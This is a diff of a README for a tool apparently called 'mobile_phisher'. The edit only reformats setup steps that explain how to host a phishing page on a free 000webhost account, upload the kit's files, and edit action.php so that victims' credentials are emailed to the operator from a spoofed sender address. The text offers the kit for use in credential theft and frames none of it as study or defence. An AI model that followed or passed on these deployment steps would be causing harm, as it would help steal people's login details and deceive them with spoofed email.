@@ -8,14 +8,21 @@ In this case we upload a nice looking index.html and a stupid looking php, But t
 
 # Setup
 
-1:) create a free account on 000webhost.com
-2:) login to file manager
-3:) create a folder to keep your files
-4:) upload all the three files in mobile_phisher to your folder that you created in step-3.
-5:) edit action.php and add any valid email to line 14 ( without brackets )
+[1] create a free account on 000webhost.com
+
+[2] login to file manager
+
+[3] create a folder to keep your files
+
+[4] upload all the three files in mobile_phisher to your folder that you created in step-3.
+
+[5] edit action.php and add any valid email to line 14 ( without brackets )
 The email that you add to line 14 is the email address that you will get your credential emails from ( it will br spoofed )
-6:) add your email ( Receiver's Email ) to line 15.
-7:) save and close action.php and go to your website
+
+[6] add your email ( Receiver's Email ) to line 15.
+
+
+[7] save and close action.php and go to your website
 
 https://yoursubdomain.000webhostapp.com/yourfolder/index.html
 
